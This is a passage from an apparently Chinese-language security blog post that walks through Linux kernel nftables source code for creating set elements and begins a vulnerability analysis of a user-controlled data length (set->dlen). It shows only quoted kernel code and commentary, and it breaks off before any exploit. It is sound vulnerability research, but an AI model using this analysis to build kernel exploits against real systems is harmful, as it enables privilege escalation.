class="built_in">set</span>-&gt;klen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY_END]) &#123;</span><br><span class="line">err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key_end.val,</span><br><span class="line">    nla[NFTA_SET_ELEM_KEY_END]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_parse_key;</span><br><span class="line"></span><br><span class="line">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY_END, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (timeout &gt; <span class="number">0</span>) &#123;</span><br><span class="line">nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_EXPIRATION);</span><br><span class="line"><span class="keyword">if</span> (timeout != <span class="built_in">set</span>-&gt;timeout)</span><br><span class="line">nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_TIMEOUT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr)</span><br><span class="line">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_EXPR,</span><br><span class="line">       expr-&gt;ops-&gt;size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_OBJREF] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_OBJECT)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_parse_key_end;</span><br><span class="line">&#125;</span><br><span class="line">obj = nft_obj_lookup(ctx-&gt;net, ctx-&gt;table,</span><br><span class="line">     nla[NFTA_SET_ELEM_OBJREF], <span class="built_in">set</span>-&gt;objtype,</span><br><span class="line">     genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(obj)) &#123;</span><br><span class="line">err = PTR_ERR(obj);</span><br><span class="line"><span class="keyword">goto</span> err_parse_key_end;</span><br><span class="line">&#125;</span><br><span class="line">nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_OBJREF);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_DATA] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = nft_setelem_parse_data(ctx, <span class="built_in">set</span>, &amp;desc, &amp;elem.data.val,</span><br><span class="line">     nla[NFTA_SET_ELEM_DATA]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_parse_key_end;</span><br><span class="line"></span><br><span class="line">dreg = nft_type_to_reg(<span class="built_in">set</span>-&gt;dtype);</span><br><span class="line">list_for_each_entry (binding, &amp;<span class="built_in">set</span>-&gt;bindings, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">bind_ctx</span> =</span> &#123;</span><br><span class="line">.net = ctx-&gt;net,</span><br><span class="line">.family = ctx-&gt;family,</span><br><span class="line">.table = ctx-&gt;table,</span><br><span class="line">.chain = (struct nft_chain *)binding-&gt;chain,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(binding-&gt;flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">err = nft_validate_register_store(&amp;bind_ctx, dreg,</span><br><span class="line">  &amp;elem.data.val,</span><br><span class="line">  desc.type, desc.len);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_parse_data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (desc.type == NFT_DATA_VERDICT &amp;&amp;</span><br><span class="line">    (elem.data.val.verdict.code == NFT_GOTO ||</span><br><span class="line">     elem.data.val.verdict.code == NFT_JUMP))</span><br><span class="line">nft_validate_state_update(ctx-&gt;net,</span><br><span class="line">  NFT_VALIDATE_NEED);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_DATA, desc.len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The full maximum length of userdata can exceed the maximum</span></span><br><span class="line"><span class="comment"> * offset value (U8_MAX) for following extensions, therefor it</span></span><br><span class="line"><span class="comment"> * must be the last extension added.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ulen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_USERDATA] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ulen = nla_len(nla[NFTA_SET_ELEM_USERDATA]);</span><br><span class="line"><span class="keyword">if</span> (ulen &gt; <span class="number">0</span>)</span><br><span class="line">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_USERDATA,</span><br><span class="line">       ulen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">elem.priv = nft_set_elem_init(<span class="built_in">set</span>, &amp;tmpl, elem.key.val.data,</span><br><span class="line">      elem.key_end.val.data, elem.data.val.data,</span><br><span class="line">      timeout, expiration, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (elem.priv == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_parse_data;</span><br><span class="line"></span><br><span class="line">ext = nft_set_elem_ext(<span class="built_in">set</span>, elem.priv);</span><br><span class="line"><span class="keyword">if</span> (flags)</span><br><span class="line">*nft_set_ext_flags(ext) = flags;</span><br><span class="line"><span class="keyword">if</span> (ulen &gt; <span class="number">0</span>) &#123;</span><br><span class="line">udata = nft_set_ext_userdata(ext);</span><br><span class="line">udata-&gt;len = ulen - <span class="number">1</span>;</span><br><span class="line">nla_memcpy(&amp;udata-&gt;data, nla[NFTA_SET_ELEM_USERDATA], ulen);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (obj) &#123;</span><br><span class="line">*nft_set_ext_obj(ext) = obj;</span><br><span class="line">obj-&gt;use++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (expr) &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(nft_set_ext_expr(ext), expr, expr-&gt;ops-&gt;size);</span><br><span class="line">kfree(expr);</span><br><span class="line">expr = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  trans = nft_trans_elem_alloc(ctx, NFT_MSG_NEWSETELEM, <span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (trans == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_trans;</span><br><span class="line"></span><br><span class="line">ext-&gt;genmask = nft_genmask_cur(ctx-&gt;net) | NFT_SET_ELEM_BUSY_MASK;</span><br><span class="line">err = <span class="built_in">set</span>-&gt;ops-&gt;insert(ctx-&gt;net, <span class="built_in">set</span>, &amp;elem, &amp;ext2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断是否存在key，接着调用<code>nft_set_ext_prepare</code>初始化tmpl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext_tmpl</span> &#123;</span></span><br><span class="line">u16len;</span><br><span class="line">u8offset[NFT_SET_EXT_NUM];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">nft_set_ext_prepare</span><span class="params">(struct nft_set_ext_tmpl *tmpl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(tmpl, <span class="number">0</span>, <span class="keyword">sizeof</span>(*tmpl));</span><br><span class="line">tmpl-&gt;len = <span class="keyword">sizeof</span>(struct nft_set_ext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着通过<code>nft_setelem_parse_flags</code>拿到用户传入的flag，并且通过<code>nft_set_ext_add</code>函数给tmpl添加flag对应的长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">nft_set_ext_add_length</span><span class="params">(struct nft_set_ext_tmpl *tmpl, u8 id,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">tmpl-&gt;len = ALIGN(tmpl-&gt;len, nft_set_ext_types[id].align);</span><br><span class="line">BUG_ON(tmpl-&gt;len &gt; U8_MAX);</span><br><span class="line">tmpl-&gt;offset[id] = tmpl-&gt;len;</span><br><span class="line">tmpl-&gt;len+= nft_set_ext_types[id].len + len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">nft_set_ext_add</span><span class="params">(struct nft_set_ext_tmpl *tmpl, u8 id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nft_set_ext_add_length(tmpl, id, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后对set的类型进行判断以及对用户是否输入对应的值进行判断。</p><p>后面是对timeout和expiration进行设置。</p><p>然后如果需要创建expr则会生成expr，如果用户没有指定并且set存在expr则会直接clone一个。</p><p>下面就是比较重要的调用<code>nft_setelem_parse_key</code>函数解析用户传入的key。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nft_data_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_data *data,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size, struct nft_data_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_DATA_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(tb, NFTA_DATA_MAX, nla,</span><br><span class="line">  nft_data_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_DATA_VALUE])</span><br><span class="line"><span class="keyword">return</span> nft_value_init(ctx, data, size, desc,</span><br><span class="line">      tb[NFTA_DATA_VALUE]);</span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_DATA_VERDICT] &amp;&amp; ctx != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> nft_verdict_init(ctx, data, desc, tb[NFTA_DATA_VERDICT]);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_data_init);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_setelem_parse_key</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct nft_data *key, struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_data_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nft_data_init(ctx, key, NFT_DATA_VALUE_MAXLEN, &amp;desc, attr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (desc.type != NFT_DATA_VALUE || desc.len != <span class="built_in">set</span>-&gt;klen) &#123;</span><br><span class="line">nft_data_release(key, desc.type);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面主要是调用了<code>nft_data_init</code>函数，而其内部就是我们较为熟悉的<code>nla_parse_nested_deprecated</code>最终会将attr中的内容放入到eb中，后根据不同的类型进入到下方不同的函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_value_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_data *data,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size, struct nft_data_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">len = nla_len(nla);</span><br><span class="line"><span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (len &gt; size)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">nla_memcpy(data-&gt;data, nla, len);</span><br><span class="line">desc-&gt;type = NFT_DATA_VALUE;</span><br><span class="line">desc-&gt;len = len;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里以<code>NFTA_DATA_VALUE</code>为例，其目的就是将tb中的内容写到key中，并设置desc的类型与长度，出来之后判断其类型是否为<code>NFTA_DATA_VALUE</code>以及长度是否和<code>set-&gt;klen</code>一致。</p><p>在完成对传入的key的解析之后会调用<code>nft_set_ext_add_length</code>函数维持tmpl。</p><p>再往后又是继续分析<code>NFTA_SET_ELEM_DATA</code>中的内容，并写入到<code>&amp;elem.data.val</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_setelem_parse_data</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct nft_data_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct nft_data *data, struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != <span class="built_in">set</span>-&gt;dlen) &#123;</span><br><span class="line">nft_data_release(data, desc-&gt;type);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在完成上述对传入的内容检测以及解析之后会调用<code>nft_set_elem_init</code>对element进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">nft_set_elem_init</span><span class="params">(<span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nft_set_ext_tmpl *tmpl, <span class="keyword">const</span> u32 *key,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> u32 *key_end, <span class="keyword">const</span> u32 *data, u64 timeout,</span></span></span><br><span class="line"><span class="params"><span class="function">u64 expiration, <span class="keyword">gfp_t</span> gfp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>;</span></span><br><span class="line"><span class="keyword">void</span> *elem;</span><br><span class="line"></span><br><span class="line">elem = kzalloc(<span class="built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);</span><br><span class="line"><span class="keyword">if</span> (elem == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ext = nft_set_elem_ext(<span class="built_in">set</span>, elem);</span><br><span class="line">nft_set_ext_init(ext, tmpl);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(nft_set_ext_key(ext), key, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_KEY_END))</span><br><span class="line"><span class="built_in">memcpy</span>(nft_set_ext_key_end(ext), key_end, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))</span><br><span class="line"><span class="built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_EXPIRATION)) &#123;</span><br><span class="line">*nft_set_ext_expiration(ext) = get_jiffies_64() + expiration;</span><br><span class="line"><span class="keyword">if</span> (expiration == <span class="number">0</span>)</span><br><span class="line">*nft_set_ext_expiration(ext) += timeout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_TIMEOUT))</span><br><span class="line">*nft_set_ext_timeout(ext) = timeout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> elem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先通过申请<code>set-&gt;ops-&gt;elemsize + tmpl-&gt;len</code>大小的堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">nft_set_ext</span><span class="params">(<span class="keyword">const</span> struct nft_set_ext *ext, u8 id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)ext + ext-&gt;offset[id];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct nft_data *<span class="title">nft_set_ext_key</span><span class="params">(<span class="keyword">const</span> struct nft_set_ext *ext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> nft_set_ext(ext, NFT_SET_EXT_KEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct nft_data *<span class="title">nft_set_ext_key_end</span><span class="params">(<span class="keyword">const</span> struct nft_set_ext *ext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> nft_set_ext(ext, NFT_SET_EXT_KEY_END);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct nft_data *<span class="title">nft_set_ext_data</span><span class="params">(<span class="keyword">const</span> struct nft_set_ext *ext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> nft_set_ext(ext, NFT_SET_EXT_DATA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct nft_set_ext *<span class="title">nft_set_elem_ext</span><span class="params">(<span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">void</span> *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> elem + <span class="built_in">set</span>-&gt;ops-&gt;elemsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后通过<code>nft_set_elem_ext</code>函数拿到ext，随后直接调用对应的函数取出偏移通过下面的memcpy向内部写入前面解析出来的内容。</p><p>后面就是把前面的expr，obj之类的也给一并写入到ext中。</p><p>上述就是申请element的总体逻辑，可以看出来的这里tmpl的作用是记录数据大小以及其对应的偏移。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里浅浅来一个前情提要，在上一篇文章中，<a href="https://196082.github.io/2024/08/17/nftables/">nftables子系统浅分析</a>分析了set的申请过程，在<code>nf_tables_newset</code>函数中，会对set的成员进行赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ......</span></span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line"><span class="built_in">set</span>-&gt;table = table;</span><br><span class="line">write_pnet(&amp;<span class="built_in">set</span>-&gt;net, net);</span><br><span class="line"><span class="built_in">set</span>-&gt;ops   = ops;</span><br><span class="line"><span class="built_in">set</span>-&gt;ktype = ktype;</span><br><span class="line"><span class="built_in">set</span>-&gt;klen  = desc.klen;</span><br><span class="line"><span class="built_in">set</span>-&gt;dtype = dtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;objtype = objtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;dlen  = desc.dlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;expr = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;flags = flags;</span><br><span class="line"><span class="built_in">set</span>-&gt;size  = desc.size;</span><br><span class="line"><span class="built_in">set</span>-&gt;policy = policy;</span><br><span class="line"><span class="built_in">set</span>-&gt;udlen  = udlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;udata  = udata;</span><br><span class="line"><span class="built_in">set</span>-&gt;timeout = timeout;</span><br><span class="line"><span class="built_in">set</span>-&gt;gc_int = gc_int;</span><br><span class="line"><span class="built_in">set</span>-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;field_count = desc.field_count;</span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure><p>这里就可以看到熟悉的<code>set-&gt;dlen</code>，可以看到其是由<code>desc.len</code>赋值的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ......</span></span><br><span class="line">dtype = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(flags &amp; NFT_SET_MAP))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  dtype = ntohl(nla_get_be32(nla[NFTA_SET_DATA_TYPE]));</span><br><span class="line">  <span class="keyword">if</span> ((dtype &amp; NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK &amp;&amp;</span><br><span class="line">      dtype != NFT_DATA_VERDICT)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dtype != NFT_DATA_VERDICT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nla[NFTA_SET_DATA_LEN] == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));</span><br><span class="line">    <span class="keyword">if</span> (desc.dlen == <span class="number">0</span> || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    desc.dlen = <span class="keyword">sizeof</span>(struct nft_verdict);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_MAP)</span><br><span class="line">  <span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure><p>可以看到这里的<code>desc.dlen</code>是直接由用户传入的。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 